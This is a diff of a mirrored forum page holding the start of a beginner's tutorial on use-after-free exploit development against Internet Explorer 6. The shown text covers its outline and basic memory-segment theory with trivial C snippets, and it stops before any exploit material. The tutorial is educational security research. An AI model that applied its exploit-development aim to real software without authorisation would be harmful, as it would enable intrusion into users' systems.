@@ -1,34 +1,31 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">
+<html dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/content.php?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development&s=d23abe6629e94daeddb675edad35f5c7 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sat, 21 Mar 2020 09:09:49 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/content.php?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development&s=d23abe6629e94daeddb675edad35f5c7 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sat, 21 Mar 2020 09:09:49 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
-<base  /><!--[if IE]></base><![endif]-->
-<meta name="generator" content="vBulletin 4.2.1" />
-<meta http-equiv="X-UA-Compatible" content="IE=9" />
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
+<base/><!--[if IE]></base><![endif]-->
+<meta content="vBulletin 4.2.1" name="generator"/>
+<meta content="IE=9" http-equiv="X-UA-Compatible"/>
 
-	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>
 
 
-		<meta name="keywords" content="" />
-		<meta name="description" content="heap memory free stack data line stored program virtual segment" />
+		<meta content="" name="keywords"/>
+		<meta content="heap memory free stack data line stored program virtual segment" name="description"/>
 
 
 
-	<meta property="fb:app_id" content="170793809601191" />
-<meta property="og:site_name" content="Garage4hackers Forum" />
-<meta property="og:description" content="heap memory free stack data line stored program virtual segment" />
-<meta property="og:url" content="content34e8.html?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development" />
-<meta property="og:type" content="article" />
+	<meta content="170793809601191" property="fb:app_id"/>
+<meta content="Garage4hackers Forum" property="og:site_name"/>
+<meta content="heap memory free stack data line stored program virtual segment" property="og:description"/>
+<meta content="content34e8.html?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development" property="og:url"/>
+<meta content="article" property="og:type"/>
 
 
 
 
 	
-		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+		<script src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js" type="text/javascript"></script>
 	
 
 <script type="text/javascript">
@@ -69,16 +66,16 @@
 	var AJAXBASEURL = "index.html";
 // -->
 </script>
-<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+<script src="clientscript/vbulletin-core6719.js?v=421" type="text/javascript"></script>
 
 
 
-	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	<link href="external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum RSS Feed" type="application/rss+xml"/>
 	
 
 
 
-	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+	<link href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," rel="stylesheet" type="text/css"/>
 
 	<!--[if lt IE 8]>
 	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
@@ -86,11 +83,11 @@
 
 
     
-        <link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - CMS RSS Feed" href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" />
+        <link href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" rel="alternate" title="Garage4hackers Forum - CMS RSS Feed" type="application/rss+xml"/>
     
-    <title>Garage4hackers Forum - Beginners Guide to &quot;Use after free Exploits #IE 6 0-day #Exploit Development&quot;</title>
+    <title>Garage4hackers Forum - Beginners Guide to "Use after free Exploits #IE 6 0-day #Exploit Development"</title>
 	
-		<link rel="stylesheet" type="text/css" href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," />
+		<link href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," rel="stylesheet" type="text/css"/>
 	
     <!--[if lt IE 8]>
         <link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=vbcms-ie.css,postbit-lite-ie.css,postlist-ie.css" />
@@ -100,46 +97,46 @@
 		window.LESS_THAN_IE7 = true;
 	</script>
     <![endif]-->
-	<script type="text/javascript" src="clientscript/vbulletin_overlay6719.js?v=421"></script>
-	<script type="text/javascript" src="clientscript/vbulletin_cms6719.js?v=421"></script>
-	<script type="text/javascript" src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421">
+	<script src="clientscript/vbulletin_overlay6719.js?v=421" type="text/javascript"></script>
+	<script src="clientscript/vbulletin_cms6719.js?v=421" type="text/javascript"></script>
+	<script src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421" type="text/javascript">
     </script>
-    <link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+    <link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body style="text-align:left">
 <div class="above_body"> <!-- closing tag is in template navbar -->
-<div id="header" class="floatcontainer doc_header">
-	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.png" alt="Garage4hackers Forum" /></a></div>
-	<div id="toplinks" class="toplinks">
+<div class="floatcontainer doc_header" id="header">
+	<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
+	<div class="toplinks" id="toplinks">
 		
 			<ul class="nouser">
 			
 				<li><a href="register.html" rel="nofollow">Register</a></li>
 			
-				<li><a rel="help" href="faq.html">Help</a></li>
+				<li><a href="faq.html" rel="help">Help</a></li>
 				<li>
-			<script type="text/javascript" src="clientscript/vbulletin_md56719.js?v=421"></script>
-			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
-				<fieldset id="logindetails" class="logindetails">
+			<script src="clientscript/vbulletin_md56719.js?v=421" type="text/javascript"></script>
+			<form action="../external.html?link=http://garage4hackers.com/login.php?do=login" id="navbar_loginform" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset class="logindetails" id="logindetails">
 					<div>
 						<div>
-					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
-					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
-					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
-					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+					<input accesskey="u" class="textbox default-value" id="navbar_username" name="vb_login_username" size="10" tabindex="101" type="text" value="User Name"/>
+					<input class="textbox" id="navbar_password" name="vb_login_password" size="10" tabindex="102" type="password"/>
+					<input class="textbox default-value" id="navbar_password_hint" name="vb_login_password_hint" size="10" style="display:none;" tabindex="102" type="text" value="Password"/>
+					<input accesskey="s" class="loginbutton" tabindex="104" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." type="submit" value="Log in"/>
 						</div>
 					</div>
 				</fieldset>
-				<div id="remember" class="remember">
-					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				<div class="remember" id="remember">
+					<label for="cb_cookieuser_navbar"><input accesskey="c" class="cb_cookieuser_navbar" id="cb_cookieuser_navbar" name="cookieuser" tabindex="103" type="checkbox" value="1"/> Remember Me?</label>
 				</div>
 
-				<input type="hidden" name="s" value="" />
-				<input type="hidden" name="securitytoken" value="guest" />
-				<input type="hidden" name="do" value="login" />
-				<input type="hidden" name="vb_login_md5password" />
-				<input type="hidden" name="vb_login_md5password_utf" />
+				<input name="s" type="hidden" value=""/>
+				<input name="securitytoken" type="hidden" value="guest"/>
+				<input name="do" type="hidden" value="login"/>
+				<input name="vb_login_md5password" type="hidden"/>
+				<input name="vb_login_md5password_utf" type="hidden"/>
 			</form>
 			<script type="text/javascript">
 			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
@@ -201,9 +198,9 @@
 			</script>
 				</li>
 				
-					<li id="fb_headerbox" class="hidden">
+					<li class="hidden" id="fb_headerbox">
 
-	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.gif" alt="The Facebook Platform" /></a>
+	<a href="#" id="fb_loginbtn"><img alt="The Facebook Platform" src="images/misc/facebook_login.gif"/></a>
 
 </li>
 
@@ -215,14 +212,14 @@
 		 
 		 
 	</div>
-	<hr />
+	<hr/>
 </div>
-<div id="navbar" class="navbar">
-	<ul id="navtabs" class="navtabs floatcontainer">
+<div class="navbar" id="navbar">
+	<ul class="navtabs floatcontainer" id="navtabs">
 		
 		
 	
-		<li  id="vbtab_whatsnew">
+		<li id="vbtab_whatsnew">
 			<a class="navtab" href="activity.html">What's New?</a>
 		</li>
 		
@@ -246,35 +243,35 @@
 		
 
 	
-		<li  id="vbtab_forum">
+		<li id="vbtab_forum">
 			<a class="navtab" href="forum.html">Forum</a>
 		</li>
 		
 		
 
 	
-		<li  id="vbtab_blog">
+		<li id="vbtab_blog">
 			<a class="navtab" href="blog.html">Blogs</a>
 		</li>
 		
 		
 
 	
-		<li  id="tab_nja4_357">
+		<li id="tab_nja4_357">
 			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
 		</li>
 		
 		
 
 	
-		<li  id="tab_nta0_579">
+		<li id="tab_nta0_579">
 			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
 		</li>
 		
 		
 
 	
-		<li  id="tab_nta0_442">
+		<li id="tab_nta0_442">
 			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
 		</li>
 		
@@ -284,16 +281,16 @@
             <a class="navtab" href="pages.html">Events and Conferences</a></li>
 	</ul>
 	
-		<div id="globalsearch" class="globalsearch">
-			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+		<div class="globalsearch" id="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" class="navbar_search" id="navbar_search" method="post">
 				
-				<input type="hidden" name="securitytoken" value="guest" />
-				<input type="hidden" name="do" value="process" />
-				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
-				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.png" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+				<input name="securitytoken" type="hidden" value="guest"/>
+				<input name="do" type="hidden" value="process"/>
+				<span class="textboxcontainer"><span><input class="textbox" name="query" tabindex="99" type="text" value=""/></span></span>
+				<span class="buttoncontainer"><span><input class="searchbutton" name="submit" onclick="document.getElementById('navbar_search').submit;" src="images/buttons/search.png" tabindex="100" type="image"/></span></span>
 			</form>
 			<ul class="navbar_advanced_search">
-				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				<li><a accesskey="4" href="search.html">Advanced Search</a></li>
 				
 			</ul>
 		</div>
@@ -302,19 +299,19 @@
 </div><!-- closing div for above_body -->
 
 <div class="body_wrapper">
-<div id="breadcrumb" class="breadcrumb">
+<div class="breadcrumb" id="breadcrumb">
 	<ul class="floatcontainer">
-		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.png" alt="Home" /></a></li>
+		<li class="navbithome"><a accesskey="1" href="content.html"><img alt="Home" src="images/misc/navbit-home.png"/></a></li>
 		
 	<li class="navbit"><a href="content.html">Home</a></li>
 
 	<li class="navbit"><a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></li>
 
 		
-	<li class="navbit lastnavbit"><span>Beginners Guide to &quot;Use after free Exploits #IE 6 0-day #Exploit Development&quot;</span></li>
+	<li class="navbit lastnavbit"><span>Beginners Guide to "Use after free Exploits #IE 6 0-day #Exploit Development"</span></li>
 
 	</ul>
-	<hr />
+	<hr/>
 </div>
 
 
@@ -334,32 +331,28 @@ google_color_url = "";
 google_ui_features = "rc:6";
 //-->
 </script>
-<script type="text/javascript"
-  src="../pagead2.googlesyndication.com/pagead/f.txt">
+<script src="../pagead2.googlesyndication.com/pagead/f.txt" type="text/javascript">
 </script>
 </div>
 
-<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/f.txt"></script>
+<div id="ad_global_below_navbar"><script async="" src="../pagead2.googlesyndication.com/pagead/js/f.txt"></script>
 <!-- garage1 -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:728px;height:90px"
-     data-ad-client="ca-pub-6847984837250662"
-     data-ad-slot="4036513682"></ins>
+<ins class="adsbygoogle" data-ad-client="ca-pub-6847984837250662" data-ad-slot="4036513682" style="display:inline-block;width:728px;height:90px"></ins>
 <script>
 (adsbygoogle = window.adsbygoogle || []).push({});
 </script></div>
 
 
-	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
-		<input type="hidden" name="do" value="dismissnotice" />
-		<input type="hidden" name="s" value="" />
-		<input type="hidden" name="securitytoken" value="guest" />
-		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
-		<input type="hidden" name="url" value="" />
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" class="notices" id="notices" method="post">
+		<input name="do" type="hidden" value="dismissnotice"/>
+		<input name="s" type="hidden" value=""/>
+		<input name="securitytoken" type="hidden" value="guest"/>
+		<input id="dismiss_notice_hidden" name="dismiss_noticeid" type="hidden" value=""/>
+		<input name="url" type="hidden" value=""/>
 		<ol>
 			<li class="restore" id="navbar_notice_2">
 	
-	<html>
+	
 <h2>
 The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
 
@@ -367,7 +360,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 </h2>
 
 <!-- Mirrored from garage4hackers.com/content.php?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development&s=d23abe6629e94daeddb675edad35f5c7 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sat, 21 Mar 2020 09:09:49 GMT -->
-</html>
+
 </li>
 		</ol>
 	</form>
@@ -375,7 +368,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 
 
 <div class="vbcms_content">
-<div id="doc3" class="yui-tvb-r3">
+<div class="yui-tvb-r3" id="doc3">
 	<div id="bd">
 		<div id="yui-main">
 			<div class="yui-b">
@@ -406,11 +399,11 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 <div class="cms_widget">
 	<div class="block">
 		<div class="cms_widget_header">
-			<h3><img src="images/cms/sections.png" alt="" /> Menu</h3>
+			<h3><img alt="" src="images/cms/sections.png"/> Menu</h3>
 		</div>
 		<div class="cms_widget_content widget_content">
 			<div class="vb-tree-menu">
-				<ul >
+				<ul>
 <li><a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers" title="G4H Tutorial and Papers">G4H Tutorial and Papers</a>
 </li>
 <li><a href="content842d.html?r=4-g4h-tools-and-scripts" title="G4H Tools and Scripts">G4H Tools and Scripts</a>
@@ -514,7 +507,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 
 <div class="article_width" id="article_content">
 	<div class="title">
-                <h1 class="article_title cms_article_title"><span>Beginners Guide to &quot;Use after free Exploits #IE 6 0-day #Exploit Development&quot;</span>
+                <h1 class="article_title cms_article_title"><span>Beginners Guide to "Use after free Exploits #IE 6 0-day #Exploit Development"</span>
                         
 		</h1>
 	</div>
@@ -523,7 +516,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 		<div class="fullwidth">
 			
 				<div>
-<fb:like href="content34e8.html?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like></div>
+<fb:like action="../external.html?link=http://garage4hackers.com/like" colorscheme="light" font="tahoma" href="content34e8.html?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development" layout="standard" show_faces="false" width="260"></fb:like></div>
 			
 			
 				<div class="article_username_container">
@@ -531,20 +524,20 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 	<a class="username offline popupctrl" href="membere81f.html?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>
 	<ul class="popupbody popuphover memberaction_body">
 		<li class="left">
-			<a href="membere81f.html?u=8" class="siteicon_profile">
+			<a class="siteicon_profile" href="membere81f.html?u=8">
 				View Profile
 			</a>
 		</li>
 		
 		<li class="right">
-			<a href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+			<a class="siteicon_forum" href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" rel="nofollow">
 				View Forum Posts
 			</a>
 		</li>
 		
 		
 		<li class="left">
-			<a href="privatedce0.html?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">
+			<a class="siteicon_message" href="privatedce0.html?do=newpm&amp;u=8" rel="nofollow">
 				Private Message
 			</a>
 		</li>
@@ -552,7 +545,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 		
 		
 		<li class="right">
-			<a href="bloge81f.html?u=8" class="siteicon_blog" rel="nofollow">
+			<a class="siteicon_blog" href="bloge81f.html?u=8" rel="nofollow">
 				View Blog Entries
 			</a>
 		</li>
@@ -560,7 +553,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 		
 		
 		<li class="left">
-			<a href="index.html" class="siteicon_homepage">
+			<a class="siteicon_homepage" href="index.html">
 				Visit Homepage
 			</a>
 		</li>
@@ -568,7 +561,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 		
 		
 		<li class="right">
-			<a href="list2c25.html?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">
+			<a class="siteicon_article" href="list2c25.html?r=author/8-fb1h2s" rel="nofollow">
 				View Articles
 			</a>
 		</li>
@@ -585,32 +578,32 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
                         
                                 <div class="article_rating_container">
                                         <div class="popupmenu cmsratingmenu" id="cmsrating">
-                                                <h6><a class="popupctrl" href="javascript://" id="cmsrating_current"><img class="inlineimg" src="images/rating/rating-15_1.png" alt="" /></a></h6>
-                                                <form action="../external.html?link=http://garage4hackers.com/content.php?143/rate" method="post" id='cms_cmsrate_form'>
+                                                <h6><a class="popupctrl" href="javascript://" id="cmsrating_current"><img alt="" class="inlineimg" src="images/rating/rating-15_1.png"/></a></h6>
+                                                <form action="../external.html?link=http://garage4hackers.com/content.php?143/rate" id="cms_cmsrate_form" method="post">
                                                         <ul class="popupbody popuphover">
                                                                 
                                                                         <li><label for="r5"><span class="rating5 cmsrating right">
-                                                                                <input type="radio" name="vote" value="5" id="r5"  tabindex="1" /> Excellent
+                                                                                <input id="r5" name="vote" tabindex="1" type="radio" value="5"/> Excellent
                                                                         </span></label></li>
                                                                         <li><label for="r4"><span class="rating4 cmsrating right">
-                                                                                <input type="radio" name="vote" value="4" id="r4"  tabindex="1" /> Good
+                                                                                <input id="r4" name="vote" tabindex="1" type="radio" value="4"/> Good
                                                                         </span></label></li>
                                                                         <li><label for="r3"><span class="rating3 cmsrating right">
-                                                                                <input type="radio" name="vote" value="3" id="r3"  tabindex="1" /> Average
+                                                                                <input id="r3" name="vote" tabindex="1" type="radio" value="3"/> Average
                                                                         </span></label></li>
                                                                         <li><label for="r2"><span class="rating2 cmsrating right">
-                                                                                <input type="radio" name="vote" value="2" id="r2"  tabindex="1" /> Bad
+                                                                                <input id="r2" name="vote" tabindex="1" type="radio" value="2"/> Bad
                                                                         </span></label></li>
                                                                         <li><label for="r1"><span class="rating1 cmsrating right">
-                                                                                <input type="radio" name="vote" value="1" id="r1"  tabindex="1" /> Terrible
+                                                                                <input id="r1" name="vote" tabindex="1" type="radio" value="1"/> Terrible
                                                                         </span></label></li>
-                                                                        <li class="formsubmit"><input type="submit" class="button" value="Vote Now" tabindex="1" /></li>
+                                                                        <li class="formsubmit"><input class="button" tabindex="1" type="submit" value="Vote Now"/></li>
                                                                 
                                                         </ul>
-                                                        <input type="hidden" name="s" value="" />
-                                                        <input type="hidden" name="securitytoken" value="guest" />
+                                                        <input name="s" type="hidden" value=""/>
+                                                        <input name="securitytoken" type="hidden" value="guest"/>
                                                 </form>
-                                                <script type="text/javascript" src="clientscript/cms_ajax_rate6719.js?v=421"></script>
+                                                <script src="clientscript/cms_ajax_rate6719.js?v=421" type="text/javascript"></script>
                                                 <script type="text/javascript">
                                                 <!--
                                                         var nodeid = 143;
@@ -622,26 +615,26 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
                         
                         <div class="cms_clear"></div>
                         
-				<div class=" article_username_container ">
+				<div class="article_username_container">
 					
 						
 							Published on 11-15-2012  03:49 PM
 						
 					
 					
-						&nbsp;
-						&nbsp;
+						 
+						 
 					
 					
-						&nbsp;Number of Views: 37127
-						&nbsp;
+						 Number of Views: 37127
+						 
 					
 				</div>
 			
                        
                         <div class="article_rating_container">
-                            	<a href="content34e8.html?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development#comments"  rel="nofollow"><span id="comments_top_count">1</span> <span id="comments_top_text"> Comment</span></a>
-				<img src="images/misc/comment.png" alt="Comments" border="0" />
+                            	<a href="content34e8.html?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development#comments" rel="nofollow"><span id="comments_top_count">1</span> <span id="comments_top_text"> Comment</span></a>
+				<img alt="Comments" border="0" src="images/misc/comment.png"/>
                         </div>
                        
 		</div>
@@ -649,121 +642,123 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
     
     <div class="clear"></div>
 	<div class="article cms_clear restore postcontainer">
-<iframe class="restrain" title="YouTube video player" width="640" height="390" src="../external.html?link=http://www.youtube.com/embed/SLk4Ia0otko?wmode=opaque" frameborder="0"></iframe>
-<br />
-Yea right! <br />
-<br />
-Last week a friend asked few queries regarding use after free vulnerabilities, . It's been a while I wrote a tutorial so taught of cooking a beginners guide this week end.  I wanted a live target for the tutorial so my plans were to run my fuzzer on an old version of IE 6, since it is easy to find a bug in and it's not worth to blog out any new versions 0-day <img src="images/smilies/wink.png" border="0" alt="" title="Wink" class="inlineimg" /> . Any way I picked up the first test case IE crashed on and did some analysis to add it up to this tutorial.I din't spent much time with the crash since it's pointless to digg deep<br />
-<br />
- So this blog post I will explain in detail the following. <br />
-<br />
-1)The OS Heap and memory allocations. <br />
-2)Use after free issues and example buggy codes.<br />
-3) Analysis of a IE 6 crash, Use after free issue.<br />
-4) Exploiting Use after free bugs.<br />
-*Stay tuned for som Win8 IE10 stuffs ;<br />
-<br />
-<br />
-The Basics of OS Memory Management  :<br />
-<br />
-<u>Memory used by  program is divided into four,<br />
-</u><br />
-<ul><li style="">The code area aka text segment [compiled program in memory ].</li><li style="">The globals      [global variables are stored] .</li></ul><br />
-<div style="margin-left:40px">Initialized Data Segment<br />
-Uninitialized Data Segment.</div><br />
-<ul><li style="">The heap, dynamically allocated variables.</li><li style="">The stack,  parameters and local variables .</li></ul><br />
-<img src="attachment8754.png?attachmentid=557&amp;d=1352974751" border="0" alt=""  style="float: CONFIG" /><br />
-<br />
-<b>Code Area:</b><br />
-This is the region in a virtual adress space that holds the executing instructions.It is is assigned memory below the stack and heap, to prevent an overflow overwriting the code. <br />
-<b><br />
-The Globals:</b><br />
-<br />
-<b>Initialized Data segment [DS]. <br />
-</b><br />
-This region holds the global and static variables that are initialized by the programmer. <br />
-<br />
-For example:<br />
- <br />
+<iframe class="restrain" frameborder="0" height="390" src="../external.html?link=http://www.youtube.com/embed/SLk4Ia0otko?wmode=opaque" title="YouTube video player" width="640"></iframe>
+<br/>
+Yea right! <br/>
+<br/>
+Last week a friend asked few queries regarding use after free vulnerabilities, . It's been a while I wrote a tutorial so taught of cooking a beginners guide this week end.  I wanted a live target for the tutorial so my plans were to run my fuzzer on an old version of IE 6, since it is easy to find a bug in and it's not worth to blog out any new versions 0-day <img alt="" border="0" class="inlineimg" src="images/smilies/wink.png" title="Wink"/> . Any way I picked up the first test case IE crashed on and did some analysis to add it up to this tutorial.I din't spent much time with the crash since it's pointless to digg deep<br/>
+<br/>
+ So this blog post I will explain in detail the following. <br/>
+<br/>
+1)The OS Heap and memory allocations. <br/>
+2)Use after free issues and example buggy codes.<br/>
+3) Analysis of a IE 6 crash, Use after free issue.<br/>
+4) Exploiting Use after free bugs.<br/>
+*Stay tuned for som Win8 IE10 stuffs ;<br/>
+<br/>
+<br/>
+The Basics of OS Memory Management  :<br/>
+<br/>
+<u>Memory used by  program is divided into four,<br/>
+</u><br/>
+<ul><li style="">The code area aka text segment [compiled program in memory ].</li><li style="">The globals      [global variables are stored] .</li></ul><br/>
+<div style="margin-left:40px">Initialized Data Segment<br/>
+Uninitialized Data Segment.</div><br/>
+<ul><li style="">The heap, dynamically allocated variables.</li><li style="">The stack,  parameters and local variables .</li></ul><br/>
+<img alt="" border="0" src="attachment8754.png?attachmentid=557&amp;d=1352974751" style="float: CONFIG"/><br/>
+<br/>
+<b>Code Area:</b><br/>
+This is the region in a virtual adress space that holds the executing instructions.It is is assigned memory below the stack and heap, to prevent an overflow overwriting the code. <br/>
+<b><br/>
+The Globals:</b><br/>
+<br/>
+<b>Initialized Data segment [DS]. <br/>
+</b><br/>
+This region holds the global and static variables that are initialized by the programmer. <br/>
+<br/>
+For example:<br/>
+ <br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:48px;">int a = 0;
-char * fb =&quot;fb1h2s&quot;;</pre>
-</div>The string is stored in the initialized read only area.<br />
-<br />
-<b>Uninitialized Data segment [BSS]. <br />
-</b><br />
-For example:<br />
- <br />
+	<pre class="bbcode_code" style="height:48px;">int a = 0;
+char * fb ="fb1h2s";</pre>
+</div>The string is stored in the initialized read only area.<br/>
+<br/>
+<b>Uninitialized Data segment [BSS]. <br/>
+</b><br/>
+For example:<br/>
+ <br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:48px;">int a 
+	<pre class="bbcode_code" style="height:48px;">int a 
 int b ;</pre>
-</div>This would be in the BSS segment<br />
-<br />
-<b>Stack:<br />
-</b><br />
-Stack is a [Last in First out] data structure , so it's basically used for local storages and <a href="../external.html?link=http://en.wikipedia.org/wiki/Call_stack" target="_blank">function calls etc</a>.It has got it's own registers and instructions sets. So it even hold the raw byte of instruction executed by the program. This is one of the reason why stack based vulnerabilities are easy to exploit. <br />
-<br />
-Stack allocations are done when variables are stored directly to memory . <br />
-<br />
-For example:<br />
-<br />
+</div>This would be in the BSS segment<br/>
+<br/>
+<b>Stack:<br/>
+</b><br/>
+Stack is a [Last in First out] data structure , so it's basically used for local storages and <a href="../external.html?link=http://en.wikipedia.org/wiki/Call_stack" target="_blank">function calls etc</a>.It has got it's own registers and instructions sets. So it even hold the raw byte of instruction executed by the program. This is one of the reason why stack based vulnerabilities are easy to exploit. <br/>
+<br/>
